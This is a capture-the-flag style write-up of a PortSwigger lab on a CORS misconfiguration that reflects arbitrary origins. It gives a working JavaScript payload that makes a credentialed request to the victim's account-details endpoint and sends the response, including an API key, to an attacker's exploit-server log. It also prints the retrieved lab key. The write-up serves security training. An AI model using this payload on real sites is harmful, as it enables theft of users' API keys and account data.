## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/72d0eaf3-6029-4376-afef-1d60db09486a)

# Solution:

Check intercept is off, then use the browser to log in and access your account page.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/03410974-3006-4a9b-b0d8-bcdf3f63f31e)

Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/af5ec611-c4cd-44bc-88a0-39bb35a3219d)

Send the request to Burp Repeater, and resubmit it with the added header:

`Origin: https://example.com`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/7f2b86cd-6fe3-499c-93fe-2220e137b57b)

Observe that the origin is reflected in the Access-Control-Allow-Origin header.

In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL:

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/37da6202-1225-4b21-8c6a-93dea30ac933)

Click View exploit. Observe that the exploit works - you have landed on the log page and your API key is in the URL.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/6312fe7c-c004-40b8-819f-7f6309206261)

Go back to the exploit server and click Deliver exploit to victim.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/9d296ad9-1e8a-42db-ab02-6525f677ecae)

Click Access log, retrieve and submit the victim's API key to complete the lab.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/c7c451bf-da9c-4434-8316-2d5593122345)

API KEY: `ahiZVXoXK15J3i9CsAhE7AJ27B4SZI09`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/cc417157-9914-4236-98e3-619a105b6876)


